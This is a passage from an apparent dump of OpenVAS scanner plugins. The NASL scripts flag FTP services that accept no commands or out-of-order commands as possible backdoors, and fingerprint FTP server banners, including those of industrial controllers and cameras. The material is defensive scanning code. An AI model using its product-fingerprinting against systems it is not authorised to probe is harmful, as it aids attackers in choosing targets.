script_tag(name:\"creation_date\", value:\"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)\");\n
script_tag(name:\"cvss_base\", value:\"0.0\");\n
script_name(\"Fake FTP server does not accept any command\");\n
script_category(ACT_GATHER_INFO);\n
script_family(\"FTP\");\n
script_copyright(\"This script is Copyright (C) 2008 Michel Arboi\");\n
script_dependencies(\"find_service.nasl\", \"find_service_3digits.nasl\");\n
script_require_ports(\"Services/ftp\", 21);\n\n
script_tag(name:\"insight\", value:\"The remote server advertises itself as being a FTP server, but it does\n
not accept any command, which indicates that it may be a backdoor or a proxy.\n
Further FTP tests on this port will be disabled to avoid false alerts.\");\n
script_tag(name:\"summary\", value:\"The remote FTP service is not working properly\");\n\n
script_tag(name:\"qod_type\", value:\"remote_banner\");\n\n
exit(0);\n}\n\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nport = get_ftp_port( default:21 );\n\nsoc = open_sock_tcp( port );\nif( ! soc ) exit( 0 );\n\nr = ftp_recv_line( socket:soc, retry:3 );\nif( ! r ) {\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n
# TBD: Why is this commented out? set_kb_item( name:\"ftp/\" + port + \"/broken\", value:TRUE );\n
set_kb_item( name:\"ftp/\" + port + \"/no_banner\", value:TRUE );\n
ftp_close( socket:soc );\n
exit( 0 );\n}\ndebug_print( level:2, 'Banner = ', r );\n\nif( r =~ '^[45][0-9][0-9] ' || match( string:r, pattern:'Access denied*', icase:TRUE ) ) {\n
log_print( level:1, 'FTP server on port ', port, ' is closed\\n' );\n
set_kb_item( name:\"ftp/\" + port + \"/denied\", value:TRUE );\n
ftp_close( socket:soc );\n
exit( 0 );\n}\n\n# Not QUIT, as some servers close the connection without a 2xx code\nforeach cmd( make_list( \"HELP\", \"USER ftp\" ) ) {\n
send( socket:soc, data:cmd + '\\r\\n' );\n
r = ftp_recv_line( socket:soc, retry:3 );\n
if( r !~ '[1-5][0-9][0-9][ -]') {\n
debug_print( 'FTP server on port ', port, ' answer to ', cmd, ': ', r );\n
log_message( port:port );\n
set_kb_item( name:\"ftp/\" + port + \"/broken\", value:TRUE );\n
close( soc );\n
exit( 0 );\n
}\n
debug_print( level:2, 'FTP server on port ', port, ' answer to ', cmd, ': ', r );\n}\n\nclose( soc );\nexit( 0 );\n", "cvss": {"score": 0.0, "vector": "NONE"}}, {"lastseen": "2017-07-02T21:10:25", "bulletinFamily": "scanner", "description": "The remote FTP service accepts commands in any order.", "modified": "2016-10-05T00:00:00", "published": "2008-10-24T00:00:00", "href": "http://plugins.openvas.org/nasl.php?oid=80063", "id": "OPENVAS:80063", "title": "Fake FTP server accepts a bad sequence of commands", "type": "openvas", "sourceData": "# OpenVAS Vulnerability Test\n# $Id: ftpd_bad_sequence.nasl 4218 2016-10-05 14:20:48Z teissa $\n# Description: Fake FTP server accepts a bad sequence of commands\n#\n# Authors:\n# Michel Arboi <mikhail@nessus.org>\n#\n# Copyright:\n# Copyright (C) 2008 Michel Arboi\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2,\n# as published by the Free Software Foundation\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n\ntag_insight = \"The remote server advertises itself as being a a FTP server, but it \naccepts commands sent in bad order, which indicates that it may be a \nbackdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\";\ntag_summary = \"The remote FTP service accepts commands in any order.\";\n\nif(description)\n{\n script_id(80063);;\n script_tag(name:\"cvss_base_vector\", value:\"AV:N/AC:L/Au:N/C:N/I:N/A:N\");\n script_tag(name:\"qod_type\", value:\"remote_banner_unreliable\");\n script_version(\"$Revision: 4218 $\");\n script_tag(name:\"last_modification\", value:\"$Date: 2016-10-05 16:20:48 +0200 (Wed, 05 Oct 2016) $\");\n script_tag(name:\"creation_date\", value:\"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)\");\n script_tag(name:\"cvss_base\", value:\"0.0\");\n \n script_name( \"Fake FTP server accepts a bad sequence of commands\");\n script_category(ACT_GATHER_INFO);\n script_family( \"FTP\");\n script_copyright(\"This script is Copyright (C) 2008 Michel Arboi\");\n\n script_dependencies(\"find_service_3digits.nasl\", \"logins.nasl\", \"ftpd_no_cmd.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_tag(name : \"insight\" , value : tag_insight);\n script_tag(name : \"summary\" , value : tag_summary);\n exit(0);\n}\n\n#\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nfunction test(soc)\n{\n local_var\tr, score;\n score = 0;\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r)\n {\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
return NULL;\n }\n debug_print(level: 2, 'Banner = ', r);\n\n if (r =~ '^[45][0-9][0-9] ' || \n
match(string: r, pattern: 'Access denied*', icase: 1))\n {\n
debug_print('FTP server on port ', port, ' is closed\\n');\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
return NULL;\n
}\n\n send(socket: soc, data: 'PASS '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^230[ -]') # USER logged in\n {\n
debug_print('PASS accepted without USER\\n');\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
score ++;\n }\n\n send(socket: soc, data: 'USER '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r !~ '^331[ -]') return score;\n\n send(socket: soc, data: 'QUIT\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r) return score;\n send(socket: soc, data: 'QUIT\\r\\n');\n r2 = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^221[ -]' && r2 =~ '^221[ -]')\n {\n
debug_print('QUIT accepted twice\\n');\n
score ++;\n }\n return score;\n}\n\nport = get_kb_item(\"Services/ftp\");\nif (! port) port = 21; \n\nif (! get_port_state(port)) exit(0);\n\n\nsoc = open_sock_tcp(port);\nif (! soc) exit(0);\n\nscore = test(soc: soc);\n\nif ( score >= 1 )\n{\n log_message(port: port);\n set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n}\n\nftp_close(socket: soc);\n", "cvss": {"score": 0.0, "vector": "NONE"}}, {"lastseen": "2019-02-13T17:00:50", "bulletinFamily": "scanner", "description": "The remote FTP service accepts commands in any order.", "modified": "2019-02-12T00:00:00", "published": "2008-10-24T00:00:00", "id": "OPENVAS:136141256231080063", "href": "http://plugins.openvas.org/nasl.php?oid=136141256231080063", "title": "Fake FTP server accepts a bad sequence of commands", "type": "openvas", "sourceData": "# OpenVAS Vulnerability Test\n# $Id: ftpd_bad_sequence.nasl 13605 2019-02-12 13:43:31Z cfischer $\n# Description: Fake FTP server accepts a bad sequence of commands\n#\n# Authors:\n# Michel Arboi <mikhail@nessus.org>\n#\n# Copyright:\n# Copyright (C) 2008 Michel Arboi\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2,\n# as published by the Free Software Foundation\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n\nif(description)\n{\n
script_oid(\"1.3.6.1.4.1.25623.1.0.80063\");\n
script_tag(name:\"cvss_base_vector\", value:\"AV:N/AC:L/Au:N/C:N/I:N/A:N\");\n
script_tag(name:\"qod_type\", value:\"remote_banner_unreliable\");\n
script_version(\"$Revision: 13605 $\");\n
script_tag(name:\"last_modification\", value:\"$Date: 2019-02-12 14:43:31 +0100 (Tue, 12 Feb 2019) $\");\n
script_tag(name:\"creation_date\", value:\"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)\");\n
script_tag(name:\"cvss_base\", value:\"0.0\");\n\n
script_name(\"Fake FTP server accepts a bad sequence of commands\");\n\n
script_category(ACT_GATHER_INFO);\n
script_family(\"FTP\");\n
script_copyright(\"This script is Copyright (C) 2008 Michel Arboi\");\n
script_dependencies(\"find_service_3digits.nasl\", \"logins.nasl\", \"ftpd_no_cmd.nasl\");\n
script_require_ports(\"Services/ftp\", 21);\n\n
script_tag(name:\"insight\", value:\"The remote server advertises itself as being a a FTP server, but it accepts\n
commands sent in bad order, which indicates that it may be a backdoor or a proxy.\n\n
Further FTP tests on this port will be disabled to avoid false alerts.\");\n\n
script_tag(name:\"summary\", value:\"The remote FTP service accepts commands in any order.\");\n\n
exit(0);\n}\n\ninclude(\"global_settings.inc\");\ninclude(\"misc_func.inc\");\ninclude(\"ftp_func.inc\");\n\nfunction test(soc)\n{\n local_var\tr, score;\n score = 0;\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r)\n {\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
return NULL;\n }\n debug_print(level: 2, 'Banner = ', r);\n\n if (r =~ '^[45][0-9][0-9] ' ||\n
match(string: r, pattern: 'Access denied*', icase: 1))\n {\n
debug_print('FTP server on port ', port, ' is closed\\n');\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
return NULL;\n
}\n\n send(socket: soc, data: 'PASS '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^230[ -]') # USER logged in\n {\n
debug_print('PASS accepted without USER\\n');\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
score ++;\n }\n\n send(socket: soc, data: 'USER '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r !~ '^331[ -]') return score;\n\n send(socket: soc, data: 'QUIT\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r) return score;\n send(socket: soc, data: 'QUIT\\r\\n');\n r2 = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^221[ -]' && r2 =~ '^221[ -]')\n {\n
debug_print('QUIT accepted twice\\n');\n
score ++;\n }\n return score;\n}\n\nport = get_ftp_port(default:21);\n\nsoc = open_sock_tcp(port);\nif (! soc) exit(0);\n\nscore = test(soc: soc);\n\nif ( score >= 1 )\n{\n log_message(port: port);\n set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n}\n\nftp_close(socket: soc);", "cvss": {"score": 0.0, "vector": "NONE"}}, {"lastseen": "2019-06-24T16:41:57", "bulletinFamily": "scanner", "description": "This Plugin detects and reports a FTP Server Banner.", "modified": "2019-06-24T00:00:00", "published": "2005-11-03T00:00:00", "id": "OPENVAS:136141256231010092", "href": "http://plugins.openvas.org/nasl.php?oid=136141256231010092", "title": "FTP Banner Detection", "type": "openvas", "sourceData": "###############################################################################\n# OpenVAS Vulnerability Test\n#\n# FTP Banner Detection\n#\n# Authors:\n# Noam Rathaus <noamr@securiteam.com>\n#\n# Copyright:\n# Copyright (C) 2005 SecuriTeam\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2,\n# as published by the Free Software Foundation\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.\n###############################################################################\n\nif(description)\n{\n
script_oid(\"1.3.6.1.4.1.25623.1.0.10092\");\n
script_version(\"2019-06-24T08:34:07+0000\");\n
script_tag(name:\"last_modification\", value:\"2019-06-24 08:34:07 +0000 (Mon, 24 Jun 2019)\");\n
script_tag(name:\"creation_date\", value:\"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)\");\n
script_tag(name:\"cvss_base\", value:\"0.0\");\n
script_tag(name:\"cvss_base_vector\", value:\"AV:N/AC:L/Au:N/C:N/I:N/A:N\");\n
script_name(\"FTP Banner Detection\");\n
script_category(ACT_GATHER_INFO);\n
script_copyright(\"This script is Copyright (C) 2005 SecuriTeam\");\n
script_family(\"Product detection\");\n
# nb: get_ftp_banner() is using a FTP command internally which requires a\n
# successful login so the secpod_ftp_anonymous.nasl is expected to be\n
# in here. This dependency also pulls in the logins.nasl.\n
script_dependencies(\"find_service2.nasl\", \"find_service_3digits.nasl\",\n
\"ftpd_no_cmd.nasl\", \"secpod_ftp_anonymous.nasl\");\n
script_require_ports(\"Services/ftp\", 21, 990);\n\n
script_tag(name:\"summary\", value:\"This Plugin detects and reports a FTP Server Banner.\");\n\n
script_tag(name:\"qod_type\", value:\"remote_banner\");\n\n
exit(0);\n}\n\ninclude(\"ftp_func.inc\");\ninclude(\"host_details.inc\");\ninclude(\"misc_func.inc\");\n\nports = ftp_get_ports();\nforeach port( ports ) {\n\n
# nb: get_ftp_banner() is verifying the received data via ftp_verify_banner() and will\n
# return NULL/FALSE if we haven't received a FTP banner.\n
banner = get_ftp_banner( port:port );\n
if( ! banner )\n
continue;\n\n
bannerlo = tolower( banner );\n
guess = NULL;\n\n
if( service_is_unknown( port:port ) )\n
register_service( port:port, proto:\"ftp\", message:\"A FTP Server seems to be running on this port.\" );\n\n
help = get_ftp_cmd_banner( port:port, cmd:\"HELP\" );\n
syst = get_ftp_cmd_banner( port:port, cmd:\"SYST\" );\n
stat = get_ftp_cmd_banner( port:port, cmd:\"STAT\" );\n\n
set_kb_item( name:\"ftp/banner/available\", value:TRUE );\n
install = port + \"/tcp\";\n\n
if( \"NcFTPd\" >< banner ) {\n
set_kb_item( name:\"ftp/ncftpd/detected\", value:TRUE );\n
register_product( cpe:\"cpe:/a:ncftpd:ftp_server\", location:install, port:port );\n
guess += '\\n- NcFTPd';\n
}\n\n
if( \"FtpXQ FTP\" >< banner ) {\n
set_kb_item( name:\"ftp/ftpxq/detected\", value:TRUE );\n
guess += '\\n- FtpXQ FTP';\n
}\n\n
if( \"Cerberus FTP\" >< banner ) {\n
set_kb_item( name:\"ftp/cerberus/detected\", value:TRUE );\n
guess += '\\n- Cerberus FTP';\n
}\n\n
if( \"Home Ftp Server\" >< banner ) {\n
set_kb_item( name:\"ftp/home_ftp/detected\", value:TRUE );\n
guess += '\\n- Home FTP Server';\n
}\n\n
if( \"Welcome to DXM's FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/xm_easy_personal/detected\", value:TRUE );\n
guess += '\\n- XM Easy Personal FTP Server';\n
}\n\n
if( \"VicFTPS\" >< banner ) {\n
set_kb_item( name:\"ftp/vicftps/detected\", value:TRUE );\n
guess += '\\n- VicFTPS';\n
}\n\n
if( \"Core FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/core_ftp/detected\", value:TRUE );\n
guess += '\\n- Core FTP';\n
}\n\n
if( \"Femitter FTP Server ready.\" >< banner ) {\n
set_kb_item( name:\"ftp/femitter_ftp/detected\", value:TRUE );\n
guess += '\\n- Femitter FTP Server';\n
}\n\n
if( \"FileCOPA FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/intervations/filecopa/detected\", value:TRUE );\n
guess += '\\n- InterVations FileCOPA FTP Server';\n
}\n\n
if( banner =~ \"220[- ]+smallftpd\" ) {\n
set_kb_item( name:\"ftp/smallftpd/detected\", value:TRUE );\n
guess += '\\n- Small FTPD Server';\n
}\n\n
if( \"TYPSoft FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/typsoft/detected\", value:TRUE );\n
guess += '\\n- TYPSoft FTP Server';\n
}\n\n
if( \"DSC ftpd\" >< banner ) {\n
set_kb_item( name:\"ftp/ricoh/dsc_ftpd/detected\", value:TRUE );\n
guess += '\\n- Ricoh DC Software FTP Server';\n
}\n\n
if( \"Telnet-Ftp Server\" >< banner ) {\n
set_kb_item( name:\"ftp/telnet_ftp/detected\", value:TRUE );\n
guess += '\\n- Telnet-FTP Server';\n
}\n\n
if( banner =~ \"220[- ]FTP Server ready\" ) {\n
set_kb_item( name:\"ftp/ftp_ready_banner/detected\", value:TRUE );\n
guess += '\\n- Various FTP servers like KnFTP or Schneider Electric Quantum Ethernet Module ';\n
}\n\n
if( banner =~ \"220[- ]Ready\" ) {\n
set_kb_item( name:\"ftp/ready_banner/detected\", value:TRUE );\n
guess += '\\n- Various FTP servers like Janitza FTP';\n
}\n\n
if( \"TurboFTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/turboftp/detected\", value:TRUE );\n
guess += '\\n- TurboFTP Server';\n
}\n\n
if( \"BlackMoon FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/blackmoon/detected\", value:TRUE );\n
guess += '\\n- BlackMoon FTP';\n
}\n\n
if( \"Solar FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/solarftp/detected\", value:TRUE );\n
guess += '\\n- Solar FTP';\n
}\n\n
if( \"WS_FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/ws_ftp/detected\", value:TRUE );\n
guess += '\\n- WS_FTP Server';\n
}\n\n
if( \"FTP Utility FTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/konica/ftp_utility/detected\", value:TRUE );\n
guess += '\\n- Konica Minolta FTP Utility';\n
}\n\n
if( \"BisonWare BisonFTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/bisonware/bisonftp/detected\", value:TRUE );\n
guess += '\\n- BisonWare BisonFTP Server';\n
}\n\n
if( \"Welcome to ColoradoFTP\" >< banner && \"www.coldcore.com\" >< banner ) {\n
set_kb_item( name:\"ftp/coldcore/coloradoftp/detected\", value:TRUE );\n
guess += '\\n- ColoradoFTP';\n
}\n\n
if( \"FRITZ!Box\" >< banner && \"FTP server ready.\" >< banner ) {\n
set_kb_item( name:\"ftp/avm/fritzbox_ftp/detected\", value:TRUE );\n
guess += '\\n- AVM FRITZ!Box FTP';\n
}\n\n
if( egrep( string:banner, pattern:\"FTP server.*[Vv]ersion (wu|wuftpd)-\" ) ) {\n
set_kb_item( name:\"ftp/wu_ftpd/detected\", value:TRUE );\n
guess += '\\n- WU-FTPD';\n
}\n\n
if( \"WarFTPd\" >< banner || \"WAR-FTPD\" >< banner ) {\n
set_kb_item( name:\"ftp/war_ftpd/detected\", value:TRUE );\n
guess += '\\n- WarFTPd';\n
}\n\n
if( \"I'm freeFTPd\" >< banner ) {\n
set_kb_item( name:\"ftp/free_ftpd/detected\", value:TRUE );\n
guess += '\\n- freeFTPd';\n
}\n\n
if( banner =~ \"220[- ]Browser Ftp Server\\.\" ) {\n
set_kb_item( name:\"ftp/browser_ftp_server_banner/detected\", value:TRUE );\n
guess += '\\n- Various FTP servers like MySCADA MyPRO';\n
}\n\n
if( \"Welcome to D-Link's FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/dlink/ftp_server/detected\", value:TRUE );\n
guess += '\\n- Multiple D-Link products like Central WiFiManager';\n
}\n\n
if( \"pyftpd\" >< bannerlo ) {\n
set_kb_item( name:\"ftp/pyftpdlib/detected\", value:TRUE );\n
guess += '\\n- pyftpdlib';\n
}\n\n
if( \"FTP Services for ClearPath MCP\" >< banner ) {\n
set_kb_item( name:\"ftp/clearpath/mcp/detected\", value:TRUE );\n
guess += '\\n- ClearPath MCP';\n
}\n\n
if( \"welcome to vibnode.\" >< bannerlo ) {\n
set_kb_item( name:\"ftp/prueftechnik/vibnode/detected\", value:TRUE );\n
guess += '\\n- PRUFTECHNIK VIBNODE';\n
}\n\n
if( \"Welcome to Pure-FTPd\" >< banner || \"Welcome to PureFTPd\" >< banner || \"Pure-FTPd - http://pureftpd.org\" >< help ) {\n
set_kb_item( name:\"ftp/pure_ftpd/detected\", value:TRUE );\n
guess += '\\n- Pure-FTPd';\n
}\n\n
if( \"FCX STARDOM\" >< banner ) {\n
set_kb_item( name:\"ftp/yokogawa/stardom/detected\", value:TRUE );\n
guess += '\\n- Yokogawa STARDOM';\n
}\n\n
if( banner =~ \"CP ([0-9\\-]+) (IT )?FTP-Server V([0-9.]+) ready for new user\" ) {\n
set_kb_item( name:\"ftp/siemens/simatic_cp/detected\", value:TRUE );\n
guess += '\\n- Siemens SIMATIC CP';\n
}\n\n
if( banner =~ \"220[- ]FreeFloat\" || \"FreeFloat Ftp Server\" >< banner ) {\n
set_kb_item( name:\"ftp/freefloat/detected\", value:TRUE );\n
guess += '\\n- FreeFloat';\n
}\n\n
if( banner =~ \"220[- ]quickshare ftpd\" ) {\n
set_kb_item( name:\"ftp/quickshare/file_share/detected\", value:TRUE );\n
guess += '\\n- QuickShare File Share';\n
}\n\n
if( banner =~ \"220[- ]SpoonFTP\" ) {\n
set_kb_item( name:\"ftp/spoonftp/detected\", value:TRUE );\n
guess += '\\n- SpoonFTP';\n
}\n\n
if( \"Quick 'n Easy FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/quick_n_easy/detected\", value:TRUE );\n
guess += '\\n' + \"- Quick 'n Easy FTP Server\";\n
}\n\n
if( \"Powerd by BigFoolCat Ftp Server\" >< banner || banner =~ \"220[- ]+Welcome to my ftp server\" ) {\n
set_kb_item( name:\"ftp/easy_ftp/detected\", value:TRUE );\n
guess += '\\n- Easy~FTP Server';\n
}\n\n
if( \"Golden FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/golden_tfp/detected\", value:TRUE );\n
guess += '\\n- Golden FTP Server';\n
}\n\n
if( banner =~ \"220[- ]ActiveFax\" ) {\n
set_kb_item( name:\"ftp/actfax_ftp/detected\", value:TRUE );\n
guess += '\\n- ActFax FTP Server';\n
}\n\n
if( egrep( pattern:\".*heck Point Firewall-1 Secure FTP.*\", string:banner ) ) {\n
set_kb_item( name:\"ftp/fw1ftpd/detected\", value:TRUE );\n
register_product( cpe:\"cpe:/a:checkpoint:firewall-1\", location:install, port:port );\n
guess += '\\n- Check Point Firewall-1';\n
}\n\n
if( \"Menasoft GrayFTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/menasoft/sphereftp/detected\", value:TRUE );\n
guess += '\\n- Menasoft SphereFTP Server';\n
}\n\n
if( banner =~ \"220[- ](AXIS|Axis).*Network Camera\" ) {\n
set_kb_item( name:\"ftp/axis/network_camera/detected\", value:TRUE );\n
guess += '\\n- Axis Network Camera';\n
}\n\n
if( \"ProFTPD\" >< banner || \"NASFTPD Turbo station\" >< banner ) {\n
set_kb_item( name:\"ftp/proftpd/detected\", value:TRUE );\n
guess += '\\n- ProFTPD';\n
}\n\n
if( banner =~ \"^220[- ]bftpd \" ) {\n
set_kb_item( name:\"ftp/bftpd/detected\", value:TRUE );\n
guess += '\\n- Bftpd FTP';\n
}\n\n
if( \"FileZilla Server\" >< banner ) {\n
set_kb_item( name:\"ftp/filezilla/detected\", value:TRUE );\n
guess += '\\n- FileZilla';\n
}\n\n
if( banner =~ \" FTP server \\(MikroTik .* ready\" ) {\n
set_kb_item( name:\"ftp/mikrotik/detected\", value:TRUE );\n
guess += '\\n- MikroTik RouterOS';\n
}\n\n
if( \"Welcome on\" >< banner && \"Gabriel's FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/open-ftpd/detected\", value:TRUE );\n
guess += '\\n- Open-FTPD';\n
}\n\n
if( \"xlweb FTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/honeywell/falcon_xl/detected\", value:TRUE );\n
guess += '\\n- Honeywell Falcon XL Web Controller';\n
}\n\n
if( banner =~ \"220[- ]PCMan's FTP Server\" ) {\n
set_kb_item( name:\"ftp/pcmans/ftp/detected\", value:TRUE );\n
guess += '\\n' + \"-
PCMan's FTP Server\";\n
}\n\n
if( \"Welcome to Seagate Central\" >< banner ) {\n
set_kb_item( name:\"ftp/seagate/central/detected\", value:TRUE );\n
guess += '\\n- Seagate Central';\n
}\n\n
if( banner =~ \"220[- ]Titan FTP Server \" ) {\n
set_kb_item( name:\"ftp/titan/ftp/detected\", value:TRUE );\n
guess += '\\n- Titan FTP Server';\n
}\n\n
if( \"Minftpd\" >< banner ) {\n
set_kb_item( name:\"ftp/ftpdmin/detected\", value:TRUE );\n
guess += '\\n- Ftpdmin';\n
}\n\n
if( \"220 Features p a\" >< banner || \"Sami FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/samiftp/detected\", value:TRUE );\n
guess += '\\n- KarjaSoft Sami FTP';\n
}\n\n
if( banner =~ \"Welcome to the (Cisco TelePresence|Codian) MCU\" ) {\n
set_kb_item( name:\"ftp/cisco/telepresence/detected\", value:TRUE );\n
guess += '\\n- Cisco TelePresence';\n
}\n\n
if( egrep( pattern:\".*icrosoft FTP.*\", string:banner ) ) {\n
set_kb_item( name:\"ftp/microsoft/iis_ftp/detected\", value:TRUE );\n
guess += '\\n- Microsoft IIS FTP Server';\n
}\n\n
if( \"ManageUPSnet\" >< banner ) {\n
set_kb_item( name:\"ftp/manageupsnet/detected\", value:TRUE );\n
guess += '\\n- ManageUPSNET FTP';\n
}\n\n
if( \"Isilon OneFS\" >< banner ) {\n
set_kb_item( name:\"ftp/emc/isilon_onefs/detected\", value:TRUE );\n
guess += '\\n- EMC Isilon OneFS';\n
}\n\n
if( \"SurgeFTP\" >< banner ) {\n
set_kb_item( name:\"ftp/surgeftp/detected\", value:TRUE );\n
guess += '\\n- SurgeFTP';\n
}\n\n
if( \"GuildFTPd\" >< banner || \"GuildFTPD FTP\" >< banner ) {\n
set_kb_item( name:\"ftp/guildftpd/detected\", value:TRUE );\n
guess += '\\n- GuildFTPd';\n
}\n\n
if( \"IOS-FTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/cisco/ios_ftp/detected\", value:TRUE );\n
guess += '\\n- Cisco IOS FTP';\n
}\n\n
if( \"UNIVERSAL FTP SERVER\" >< banner ) {\n
set_kb_item( name:\"ftp/teamtek/universal_ftp/detected\", value:TRUE );\n
guess += '\\n- Teamtek Universal FTP';\n
}\n\n
if( \"BlackJumboDog\" >< banner ) {\n
set_kb_item( name:\"ftp/blackjumbodog/detected\", value:TRUE );\n
guess += '\\n- BlackJumboDog';\n
}\n\n
if( \"SunFTP \" >< banner ) {\n
set_kb_item( name:\"ftp/sunftp/detected\", value:TRUE );\n
guess += '\\n- SunFTP';\n
}\n\n
if( \"EFTP \" >< banner ) {\n
set_kb_item( name:\"ftp/eftp/detected\", value:TRUE );\n
guess += '\\n- EFTP';\n
}\n\n
if( \"ArGoSoft FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/argosoft/ftp/detected\", value:TRUE );\n
guess += '\\n- ArGoSoft FTP';\n
}\n\n
if( \"GlobalSCAPE Secure FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/globalscape/secure_ftp/detected\", value:TRUE );\n
guess += '\\n- GlobalSCAPE Secure FTP Server';\n
}\n\n
if( \"HP ARPA FTP\" >< banner ) {\n
set_kb_item( name:\"ftp/hp/arpa_ftp/detected\", value:TRUE );\n
guess += '\\n- HP ARPA FTP / MPEi/X';\n
}\n\n
if( egrep( pattern:\".*RaidenFTPD.*\", string:banner ) ) {\n
set_kb_item( name:\"ftp/raidenftpd/detected\", value:TRUE );\n
guess += '\\n- RaidenFTPD';\n
}\n\n
if( \"Serv-U FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/serv-u/detected\", value:TRUE );\n
guess += '\\n- Serv-U FTP';\n
}\n\n
if( \"Flash FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/flash/ftp/detected\", value:TRUE );\n
guess += '\\n- Flash FTP Server';\n
}\n\n
if( \"PlatinumFTPserver\" >< banner ) {\n
set_kb_item( name:\"ftp/platinum/ftp/detected\", value:TRUE );\n
guess += '\\n- Platinum FTP';\n
}\n\n
if( egrep( pattern:\"^220.*RobotFTP\" ) ) {\n
set_kb_item( name:\"ftp/robot/ftp/detected\", value:TRUE );\n
guess += '\\n- RobotFTP';\n
}\n\n
if( \"220 Wing FTP Server\" >< banner ) {\n
set_kb_item( name:\"ftp/wing/ftp/detected\", value:TRUE );\n
guess += '\\n- Wing FTP';\n
}\n\n
if( \"220-Complete FTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/complete/ftp/detected\", value:TRUE );\n
guess += '\\n- Complete FTP';\n
}\n\n
# 220 VxWorks FTP server (VxWorks 5.3.1 - Secure NetLinx version (1.0)) ready.\n
# 220 VxWorks (VxWorks5.4.2) FTP server ready\n
# 220 VxWorks (5.4) FTP server ready\n
# 220 VxWorks FTP server (VxWorks VxWorks5.5.1) ready.\n
# 220 Tornado-vxWorks (VxWorks5.5.1) FTP server ready\n
# 220 $hostname FTP server (VxWorks 6.4) ready.\n
# 220 VxWorks (VxWorks 6.3) FTP server ready\n
# 220 Tornado-vxWorks FTP server ready\n
# TODO: Move into own Detection-NVT. The OS part via of VxWorks is already done in gb_ftp_os_detection.nasl\n
else if( banner =~ \"[vV]xWorks\" && \"FTP server\" >< banner ) {\n
set_kb_item( name:\"ftp/vxftpd/detected\", value:TRUE );\n
register_product( cpe:\"cpe:/o:windriver:vxworks\", location:install, port:port );\n
guess += '\\n- VxWorks FTP';\n
}\n\n
if( \"XLINK\" >< banner ) {\n
